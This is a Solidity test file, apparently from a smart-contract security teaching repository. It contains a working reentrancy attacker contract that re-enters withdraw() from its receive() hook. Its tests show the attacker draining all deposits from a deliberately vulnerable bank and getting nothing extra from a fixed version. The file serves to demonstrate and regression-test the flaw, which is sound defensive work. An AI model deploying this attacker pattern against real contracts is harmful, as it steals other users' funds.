// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestHelper} from "./TestHelper.sol";
import {VulnerableBank} from "../src/reentrancy/VulnerableBank.sol";
import {FixedBank} from "../src/reentrancy/FixedBank.sol";

/// @notice Attacker contract: deposits 1 ETH, then withdraws in a loop from
///         its receive() hook until the bank is empty (or the fixed bank
///         reverts the re-entry, which the try/catch absorbs).
contract ReentrancyAttacker {
    address public immutable bank;
    bool public isFixed;

    constructor(address _bank, bool _isFixed) {
        bank = _bank;
        isFixed = _isFixed;
    }

    function deposit() external payable {
        if (isFixed) {
            FixedBank(bank).deposit{value: msg.value}();
        } else {
            VulnerableBank(bank).deposit{value: msg.value}();
        }
    }

    function attack() external {
        if (isFixed) {
            FixedBank(bank).withdraw();
        } else {
            VulnerableBank(bank).withdraw();
        }
    }

    receive() external payable {
        if (bank.balance >= 1 ether) {
            try this.poke() {} catch {}
        }
    }

    function poke() external {
        if (isFixed) {
            FixedBank(bank).withdraw();
        } else {
            VulnerableBank(bank).withdraw();
        }
    }
}

/// @notice PoC: classic reentrancy. Ten honest users deposit 1 ETH each,
///         the attacker deposits 1 ETH and re-enters withdraw() to take
///         all 11. Against the fixed bank the same contract walks away
///         with exactly its own 1 ETH.
contract ReentrancyTest is TestHelper {
    function _seedUsers(address bank, bool isFixed) internal {
        for (uint256 i = 0; i < 10; i++) {
            address user = address(uint160(0x1000 + i));
            vm.deal(user, 1 ether);
            vm.prank(user);
            if (isFixed) {
                FixedBank(bank).deposit{value: 1 ether}();
            } else {
                VulnerableBank(bank).deposit{value: 1 ether}();
            }
        }
    }

    function test_vulnerable_bank_reentrancy_drains_everything() public {
        VulnerableBank bank = new VulnerableBank();
        _seedUsers(address(bank), false);
        assertEq(bank.balance(), 10 ether, "bank seeded by users");

        ReentrancyAttacker attacker = new ReentrancyAttacker(address(bank), false);
        attacker.deposit{value: 1 ether}();
        attacker.attack();

        assertEq(bank.balance(), 0, "bank fully drained");
        assertEq(address(attacker).balance, 11 ether, "attacker took all deposits");
    }

    function test_fixed_bank_reentrancy_gets_nothing_extra() public {
        FixedBank bank = new FixedBank();
        _seedUsers(address(bank), true);

        ReentrancyAttacker attacker = new ReentrancyAttacker(address(bank), true);
        attacker.deposit{value: 1 ether}();
        attacker.attack();

        assertEq(address(attacker).balance, 1 ether, "attacker only recovered its own deposit");
        assertEq(bank.balance(), 10 ether, "user funds untouched");
    }
}
